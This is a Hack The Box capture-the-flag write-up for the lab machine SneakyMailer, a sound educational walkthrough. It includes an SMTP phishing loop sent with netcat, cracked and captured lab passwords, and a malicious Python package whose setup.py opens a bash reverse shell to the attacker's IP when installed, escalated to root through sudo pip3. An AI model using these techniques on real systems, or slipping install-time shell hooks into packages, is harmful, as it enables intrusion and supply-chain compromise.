# Hack The Box: SneakyMailer write-up

SneakyMailer was a medium-rated box based on enumeration and Python. It starts off with having to send emails to users through an insecure SMTP server to get credentials and a low-privileged shell with which we discover a virtual host. From there we craft a malicious Python package that will grant us a user shell. The privilege escalation was pretty easy, as we can run pip3 as sudo and so we just basically need to craft a malicious package and install it!

Let's start! The IP of the machine is ``10.10.10.197``.

## Enumeration

I start by enumerating open ports to discover the services running in the machine. I fire up nmap:

*Result of nmap scan*

```
# Nmap 7.80 scan initiated Sat Aug 22 13:16:23 2020 as: nmap -sV -sC -oA nmap/initial 10.10.10.197
Nmap scan report for 10.10.10.197
Host is up (0.013s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 22 13:17:11 2020 -- 1 IP address (1 host up) scanned in 48.51 seconds
```

We get a few interesting things, as always I'll start by looking at port 80. But first I'll add `sneakycorp.htb` to my `/etc/hosts` file.

### Port 80 enumeration

When trying to access `sneakycorp.htb` on my browser we get what seems like a dashboard. There aren't too many interesting things but we can see that there is some PyPi server and by exploring we get a list of emails from employees that work in the company.

*Dashboard*

![Img](images/dashboard.png)

*Emails list*

![Img](images/emails.png)

I will save them in `emails.txt` with CeWL:

```
cewl -d 3 -m 3 -e --email_file emails.txt sneakycorp.htb`
```

- `-d` to specify the depth of searched pages.
- `-m` to indicate the minimum lenght of a match.
- `-e` to include email addresses.
- `--email_file` to specify the file to save email addresses to.

Even though there is no use for it now we could use it to bruteforce later, so it may come in handy. There was nothing else that I could see here so I moved on to the next port.

### Port 8080 enumeration

When browsing to `sneakycorp.htb:8080` we can only see a Nginx default static page. I tried to bruteforce directories but unfortunately there was nothing.

*Default Nginx page*

![Img](images/nginx.png)

### Port 25 enumeration

Seeing I had a list of email addresses and a SMTP server I thought the obvious thing was to try to send an email to those addresses (if the server allowed it of course). I started with a simple manual test:

*Sending email using SMTP server*

![Img](images/email1.png)

Good! Having received queued means the message will be sent so we have confirmed we can send spoofed emails! Now, the next step would be to include some kind of link to see if the users would click on it. I wanted to automatise the manual test I had done so I ended up with the following:

```
cat emails.txt | xargs -I{} -t sh -c "./sendmail.sh {} | nc 10.10.10.197 25"
```

Where `sendmail.sh` is:

```
echo "HELO sneakymailer.htb"
echo "MAIL FROM: test@sneakymailer.htb"
echo "RCPT TO: $1"
echo "DATA"
echo "Subject: Testing one two three"
echo "Check out http://10.10.15.49:8001/"
echo "."
echo "quit"
```

What I'm doing here is using `xargs` to run `sendmail.sh` for each line in `emails.txt`, which will output all the commands I want to send to the SMTP server. Then, I just pipe all that data to netcat and voilà!

*Getting a request from the sent email*

![Img](images/email2.png)

Cool! We get some credentials after URL decoding the body post data: ```paulbyrd:^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht``` (I assumed the username to be the first name and last name).

### Courier Imapd enumeration

I tried to use these credentials to connect to the mailbox after some failed attempts at loggin to FTP.

*Using collected information to log in to the mailbox*

![Img](images/email3.png)

![Img](images/email4.png)

We are in! There were only two emails, for a password reset and for modules testing:

*Sent emails from inbox*

![Img](images/email5.png)

![Img](images/email6.png)

From the first email we get the password for `developer`: `m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C`; while for the other we get a possible user called `low` and some interesting information: user `low` will install and test every module he finds on the PyPi service.

### FTP enumeration

Looking at the places where I could use the credentials, FTP seemed like the only option and indeed it was.

*FTP connection*

![Img](images/ftp1.png)

## Low-privileged shell

The files seemed to be the ones on the website so after looking at the PHP ones to see if they had anything juicy and not finding anything I decided to try to upload a file. The file didn't appear on `sneakycorp.htb`... weird.

After a bit of thought I wondered if maybe there were more virtual hosts! Time for more recon with `ffuf`:

*Vhosts enumeration*

![Img](images/vhosts.png)

The file did appear on `dev.sneakycorp.htb`!

*FTP file upload*

![Img](images/ftp2.png)

Seeing that I uploaded a simple reverse shell and set up a listener.

*Low-privileged shell*

![Img](images/ftp3.png)

I also checked `dev.sneakycorp.htb` but there was nothing interesting, just one more endpoint that contained a register feature that didn't lead anywhere.

*Dev version of sneakycorp*

![Img](images/dev1.png)

![Img](images/dev2.png)

## PyPi server exploitation

After a bit of recon I saw the directory containing the different virtual hosts files and there was an extra one, `pypi.sneakycorp.htb`, which presumably was the one that served the PyPi server. I added it to my `/etc/hosts` file. Another thing that stood out was a `.htpasswd` file that had some hardcoded credentials.

*Hardcoded credentials in .htpasswd*

![Img](images/htpasswd.png)

I used John to crack the hash and get a new set of credentials: `pypi:soufianeelhaoui`.

*Hash cracking with John The Ripper*

![Img](images/john.png)

`pypi.sneakycorp.htb` redirected me to `sneakycorp.dev` but `pypi.sneakycorp.htb:8080` gave me the PyPi page!

*PyPi server landing page*

![Img](images/pypi1.png)

From here on it seemed clear what we had to do: upload a malicious package to the server so that `low` can 'test' it.

### Python malicious package

I used the following [reference](https://docs.python.org/3.3/distutils/packageindex.html) to create the package. Basically we need two files:

- `.pypirc`: the configuration file. We need to include the credentials we got to be able to create a package.

```
[distutils]
index-servers = test

[test]
repository = http://pypi.sneakycorp.htb:8080
username = pypi
password = soufianeelhaoui
```

- `setup.py`: the source code. I used a try except block because I was getting two connections when uploading, one from my own machine and the other from `low`, so I had to quit the first one and restart the listener.

```py
import setuptools, os

try:
    print(os.system("echo 'bash -i >&/dev/tcp/10.10.14.175/8002 0>&1' | /bin/bash"))
except Exception as e:
    pass

setuptools.setup(
    name="root2u",
    version="9.9.9",
    author="No one",
    author_email="root2u@root2u.com",
    description="Rooted",
    long_description="",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
)
```

Now that we have the barebones of the package we want to upload it to the server. We can use the following command to both register and upload the package:

```
python setup.py sdist register -r test upload -r test
```

It's important to note that first I had to run `HOME=$(pwd)`, as `.pypirc` needs to be run on the home directory. Otherwise we get an error.

*Error if uploading without being in HOME*

![Img](images/pypi2.png)

*Successful package upload*

![Img](images/pypi3.png)

After that we can see that the package count has increased:

*Increased package count*

![Img](images/pypi4.png)

And we also get a shell after a few seconds (because `low` is 'testing' it):

*User shell*

![Img](images/pypi5.png)

## Privilege escalation

The way to root was actually pretty easy, as always I tried to run `sudo -l` and got some interesting output: we could run `/usr/bin/pip3` without password as root.

After following [this article](https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/) and the proof of concept mentioned on it we easily get root.

*Root shell*

![Img](images/root.png)

The explanation is as follows:

- We create a temporary directory.
- We create a `setup.py` that will get us a root shell.
- We install the module using `pip3` as root.

Even though that was it, I really liked this box and so I kept on digging and read the scripts that were automating the stuff like clicking an email or testing the packages.

## Beyond root: how the box works

I found the directory `/opt/scripts` with a bunch of scripts that carry out the box maintenance.

*Scripts directory*

![Img](images/scripts.png)

### How developer works

The script in `developer` made sure the uploaded shells in FTP were removed consistenly so people wouldn't get hints.

```py
def main():
	for root, directories, files in os.walk("/var/www/dev.sneakycorp.htb"):
		for directory in directories:
			try:
				shutil.rmtree(os.path.join(root, directory))
			except PermissionError:
				pass
		for file in files:
			try:
				os.remove(os.path.join(root, file))
			except PermissionError:
				print(os.path.join(root, file))
```

### How vmail works

The first directory is `vmail` and was in charge of reading the user's emails, getting the possible URL on them, trying to log in to that URL, then clean the mailbox.

- `imap-user-login.py` did the first part by getting the email and logging in:

```py
def main():
    global active_threads
    # Connecting to the server
    client = imaplib.IMAP4(host, 143)
    client.login(username, password)
    # Reading mails
    client.select("Inbox")
    type_, data = client.search(None, "ALL")
    for number in data[0].split():
        while active_threads > max_threads:
            pass
        mail_type, mail_data = client.fetch(number, '(RFC822)')
        raw_email = mail_data[0][1]
        threading.Thread(target=process_email, args=(raw_email, )).start()
        active_threads += 1
        # Finally delete the mail
        client.store(number, '+FLAGS', '\\Deleted')
    while active_threads > max_threads:
        pass
    client.expunge()
    client.close()
    client.logout()
```

- `restore-sent-mail-box.py` cleared the mailbox and added the two emails that we saw earlier.

```py
for original_email in original_emails.keys():
    if not original_emails[original_email]:
        sent_mail(client, original_email)
```

### How low works

The file `install-modules.py` in `low` was just designed to get the uploaded package, execute it and then delete all the files (`install-modules.sh` just ran `install-modules.py`).

```py
def get_modules_file() -> tuple:
    response = requests.get("http://pypi.sneakycorp.htb:8080/packages/", auth=(username, password))
    return tuple(map(lambda module: module[1:-3], re.findall(r">.+<\/a", response.text)))


def uninstall_module(file_name: str):
    subprocess.run(f"/home/low/venv/bin/pip uninstall {file_name.replace('.tar.gz', '')}", shell=True)
    os.remove(f"/var/www/pypi.sneakycorp.htb/packages/{file_name}")


def install_module(file_name: str):
    with tempfile.TemporaryDirectory() as temporary_folder:
        # Decompress the tar
        subprocess.run(f"/usr/bin/tar -C {temporary_folder} -zxf /var/www/pypi.sneakycorp.htb/packages/{file_name}", shell=True)
        # Run the installation process
        subprocess.run(f"/usr/bin/screen -d -m /opt/scripts/low/install-module.sh {temporary_folder}/{file_name.replace('.tar.gz', '')}/setup.py &", shell=True)
        time.sleep(3)
```

## Conclusion

This is everything, I hope you enjoyed the writeup and learned something new. It was one of the best boxes I've done, learned a lot not only about Python but also about how to automate stuff ans some interesting techniques! If you liked it you can give me respect on Hack The Box through the following link: <https://www.hackthebox.eu/home/users/profile/31531>. Until next time!

---

*Diego Bernal Adelantado*
